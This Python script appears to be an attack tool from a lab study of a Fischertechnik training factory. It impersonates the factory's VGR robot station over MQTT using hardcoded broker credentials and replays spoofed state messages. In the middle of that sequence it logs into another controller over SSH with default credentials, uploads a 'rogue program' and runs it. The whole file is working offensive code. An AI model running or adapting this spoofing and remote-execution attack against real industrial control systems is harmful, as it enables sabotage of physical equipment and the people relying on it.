import time

from datetime import timezone, datetime

import paho.mqtt.client as mqtt

import threading

from paramiko import SSHClient
from paramiko.client import AutoAddPolicy
from scp import SCPClient

def test_threading():
    while True:
        print("First")
        time.sleep(5)
        print("Second"); time.sleep(5); print("Third")


def second_attack():
    print("Starting file upload attack on 192.168.0.13")
    server = '192.168.0.13'
    port = '22'
    username = password = 'ROBOPro'

    # create ssh object and connect
    ssh = SSHClient()
    ssh.load_host_keys('/home/kali/.ssh/known_hosts')
    ssh.set_missing_host_key_policy(AutoAddPolicy)
    ssh.connect(server, port, username, password, look_for_keys=False, allow_agent=False)

    # hijack the established tcp/ssh connection and copy files
    scp = SCPClient(ssh.get_transport())
    path = '/home/kali/fischer/vgr/C-Program/'
    # now copy the rogue program
    scp.put(f'{path}TxtParkPosVGR', '.')

    # now run the rogue program
    ssh.exec_command('./TxtParkPosVGR')
    time.sleep(7)
    ssh.connect(server, port, username, password, look_for_keys=False, allow_agent=False)
    ssh.exec_command('./TxtParkPosVGR')
    print("Finished file upload attack on 192.168.0.13")

thread = threading.Thread(target=second_attack)


"Starting"
# First we definee variables
src_ip = "192.168.0.105"
dst_ip = "192.168.0.10"
dst_port = 1883

log_sub = 0

def state(active, code, description="", station="vgr", target=None):
    if target is None:
        data = '{\n\t"active" : %s,\n\t"code" : %s,\n\t"description" : "%s",\n\t' \
               '"station" : "%s",\n\t' % (active, code, description, station)
        data += new_ts()
    else:
        data = '{\n\t"active" : %s,\n\t"code" : %s,\n\t"description" : "%s",\n\t' \
           '"station" : "%s",\n\t"target" : "%s",\n\t' % (active, code, description, station, target)
        data += new_ts()
    return data


def new_ts():
    # function to generate new timestamps
    ts = datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%S.%f')[:-3] + 'Z'
    ts_ = f'"ts" : "{ts}"\n' + '}'
    return ts_


# what happens if a ConnAct packet is received? Then we subscribe
def on_connect(client, *lis):
    # IF a ConnAck is received, then we subscribe to our packets of interest as VGR
    [client.subscribe(x) for x in
     ("f/o/state/ack", "f/o/order", "f/o/nfc/ds", "fl/ssc/joy", "fl/mpo/ack", "fl/hbw/ack", "fl/sld/ack")]
    print("Chunk subscribe done")
    time.sleep(0.1)
    # Now we publish our fir
    data = '{\n\t"hardwareId" : "50F14AE8CF8D",\n\t"message" : "init",\n\t"softwareName" : "TxtFactoryVGR",\n\t' + \
           '"softwareVersion" : "0.8.1",\n\t"station" : "VGR",\n\t' + new_ts()
    client.publish("fl/broadcast", data, qos=1)


# What happens if a SubAck is received?
def on_subscribe(client, *lis):
    pass


# What happens when a publish message is sent from us and a puback has been received
def on_publish(client, userdata, msgid, *rest):
    match msgid:
        case 8:
            time.sleep(0.4)
            # Publish for f/i/state/hbw
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "hbw",\n\t' + new_ts()
            client.publish("f/i/state/hbw", data, qos=1)

        case 9:
            # Publish for f/i/state/mpo
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "mpo",\n\t' + new_ts()
            client.publish("f/i/state/mpo", data, qos=1)

        case 10:
            # Publish for f/i/state/sld
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "sld",\n\t' + new_ts()
            client.publish("f/i/state/sld", data, qos=1)

        case 11:
            time.sleep(0.7)
            # Publish for f/i/state/vgr
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "vgr",\n\t"target" : "hbw"\n\t' + new_ts()
            client.publish("f/i/state/vgr", data, qos=1)

        case 12:
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "vgr",\n\t"target" : "mpo"\n\t' + new_ts()
            client.publish("f/i/state/vgr", data, qos=1)

        case 13:
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "vgr",\n\t"target" : "dso"\n\t' + new_ts()
            client.publish("f/i/state/vgr", data, qos=1)

        case 14:
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "vgr",\n\t"target" : "dsi"\n\t' + new_ts()
            client.publish("f/i/state/dsi", data, qos=1)

        case 15:
            data = state("0", "0", description="", station="dso")
            client.publish("f/i/state/dso", data, qos=1)

        case 16:
            data = '{\n\t"state" : "WAITING_FOR_ORDER",\n\t' + new_ts()[:-2] + ',\n\t"type" : "NONE"\n }'
            client.publish("f/i/order", data, qos=1)

        case 17:
            data = '{\n\t"history" : null,\n\t' + new_ts()[:-2] + ',\n\t"workpiece" : \n\t{\n\t\t"id" : "",\n\t\t' \
                   '"state" : "RAW",\n\t\t"type" : "NONE"\n\t}\n}'
            client.publish("f/i/nfc/ds", data, qos=1)

        # Case bundle for situation where same information (active=0,code=1) is sent in f/i/state/vgr
        case 18 | 23 | 26 | 27 | 28:
            (active, code) = (1, 2) if msgid in [18, 26] else (0, 1)
            data = state(active, code, "", "vgr", "")
            client.publish("f/i/state/vgr", data, qos=1)

        case 19 | 21 | 24 | 29 | 31 | 65 | 77 | 82 | 84:
            if msgid == 21:
                time.sleep(0.7)
            data = state(0, 1, "", "dsi")
            client.publish("f/i/state/dsi", data, qos=1)

        case 20 | 22 | 25 | 30 | 32 | 66 | 78 | 83 | 85:
            data = state(0, 1, "", f"dso")
            client.publish("f/i/state/dso", data, qos=1)

        case 33:
            time.sleep(4)
            data = state(0, 0, "", "dsi")
            client.publish("f/i/state/dsi", data, qos=1)

        case 34, 36, 38, 45:
            data = state(0, 1, "", "dso")
            client.publish("f/i/state/dso", data, qos=1)

        case 35:
            data = state(0, 0, "", "dsi")
            client.publish("f/i/state/dsi", data, qos=1)

        case 37:
            data = state(1, 0, "", "dsi")
            client.publish("f/i/state/dsi", data, qos=1)

        # case block to handle bulk cases where active, code, target is 0,1,hbw respectively
        case 39 | 43 | 48 | 50 | 52 | 53 | 54 | 56 | 58 | 60 | 61 | 69 | 71 | 72 | 73 | 80 | 81 | 86:
            if msgid == 50:
                time.sleep(1.7)
            if msgid == 54:
                time.sleep(1.4)
            if msgid == 58:
                time.sleep(1.3)
            if msgid == 61:
                time.sleep(2.3)
            if msgid == 69:
                time.sleep(2)
            if msgid == 71:
                time.sleep(1)
            if msgid == 72:
                time.sleep(7)
            if msgid == 73:
                time.sleep(10)
                
            data = state(0, 1, "", "vgr", "hbw")
            client.publish("f/i/state/vgr", data, qos=1)

            if msgid == 86:
                # wait for file upload attack to end
                thread.join()

    # case block to handle bulk cases where active, code, target is 1,2,hbw respectively
        case 40 | 42 | 47 | 49 | 51 | 55 | 57 | 59 | 67 | 68 | 70 | 79:
            if msgid == 49:
                time.sleep(0.5)
            if msgid == 68:
                time.sleep(6)
            data = state(1, 2, "", "vgr", "hbw")
            client.publish("f/i/state/vgr", data, qos=1)

        case 41:
            time.sleep(0.4)
            data = state(0, 1, "", "vgr", "hbw")
            client.publish("f/i/state/vgr", data, qos=1)

        case 44:
            data = state(1, 1, "", "dsi")
            client.publish("f/i/state/dsi", data, qos=1)

        case 45:
            data = state(0, 1, "", "dso")
            client.publish("f/i/state/dso", data, qos=1)

        case 46:
            time.sleep(1.5)
            data = state(1, 2, "", "vgr", "hbw")
            client.publish("f/i/state/vgr", data, qos=1)

        case 62:
            data = '{\n\t"history" : null,\n\t' + new_ts()[:-2] + ',\n\t"workpiece" : \n\t{\n\t\t"id" : "04859c92186581",\n\t\t' \
                                                                  '"state" : "RAW",\n\t\t"type" : "NONE"\n\t}\n}'
            client.publish("f/i/nfc/ds", data, qos=1)

        case 63:
            data = '{\n\t"history" : \n\t[\n\t\t{\n\t\t\t"code" : 100,\n\t\t\t' + new_ts()[:-2] + '\n\t\t},\n\t\t{\n\t\t\t' \
                    '"code" : 200,\n\t\t\t' + new_ts()[:-2] + '\n\t\t}\n\t],\n\t' + new_ts()[:-2] + \
                    ',\n\t"workpiece" : \n\t{\n\t\t"id" : "04859c92186581",\n\t\t"state" : "RAW",\n\t\t"type" : "WHITE"\n\t}\n}'
            client.publish("f/i/nfc/ds", data, qos=1)

        case 64:
            data = '{\n\t"code" : 1,\n\t' + new_ts()[:-2] + \
                   ',\n\t"workpiece" : \n\t{\n\t\t"id" : "04859c92186581",\n\t\t"state" : "RAW",\n\t\t"type" : "WHITE"\n\t}\n}'
            client.publish("fl/vgr/do", data, qos=1)
            thread.start()

        case 74:
            #This is where the VGR (after the container has been fetched by the HBW) does the action of dropping the WP on the container
            time.sleep(0.5)
            data = '{\n\t"code" : 2,\n\t' + new_ts()[:-2] + \
                   ',\n\t"workpiece" : \n\t{\n\t\t"id" : "04859c92186581",\n\t\t"state" : "RAW",\n\t\t"type" : "WHITE"\n\t}\n}'
            client.publish("fl/vgr/do", data, qos=1)

        case 75:
            # The VGR immediately before dropping the WP, informs that it has gone active again and then takes 8 seconds
            # to rotate back to its home position
            data = state(1, 2, "", "vgr", "hbw")
            client.publish("f/i/state/vgr", data, qos=1)

        case 76:
            # The VGR after 8 seconds is now back to its default/home location
            # and immediately sends out its state that it has become inactive
            data = state(0, 1, "", "vgr", "hbw")
            client.publish("f/i/state/vgr", data, qos=1)


        # After ack 86, I don't seem to care anymore

        # case to send f/i/state/vgr information every 10 seconds when there is no process to fufill in FL
        case _:
            time.sleep(10)
            data = state(0, 1, "", "vgr", "hbw")
            client.publish("f/i/state/vgr", data, qos=1)




# What happens if a Publish Message is received? Then we send PubAck
# **** seems no need for below function. doc says that once on_message returns, a puback is implicity sent out to acknowledge the message
# def on_message(client, userdata, mqttmsg):
#     # this automatic behavior can be change by setting manual_ack=True in Client() and then using .ack to manually send puback
#     # -------------------
#     print(f"""A publish message was received from broker with the following signature
#     Client: {client}
#     Other: {mqttmsg}""")
#     client.ack(mid=mqttmsg.mid, qos=mqttmsg.qos)  #-- plan here is to take the mid and qos from the received message and place here





mqtt_connect = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id='TxtFactoryVGRV0.8.1', clean_session=True, protocol=mqtt.MQTTv31)
mqtt_connect.username_pw_set('txt', 'xtx')
mqtt_connect.connect(host=dst_ip, port=dst_port, keepalive=60, )

mqtt_connect.on_connect = on_connect
mqtt_connect.on_subscribe = on_subscribe
mqtt_connect.on_publish = on_publish
# mqtt_connect.on_message = on_message  -- use this if manual_ack==True is ever set in mqtt.Client


mqtt_connect.loop_forever()




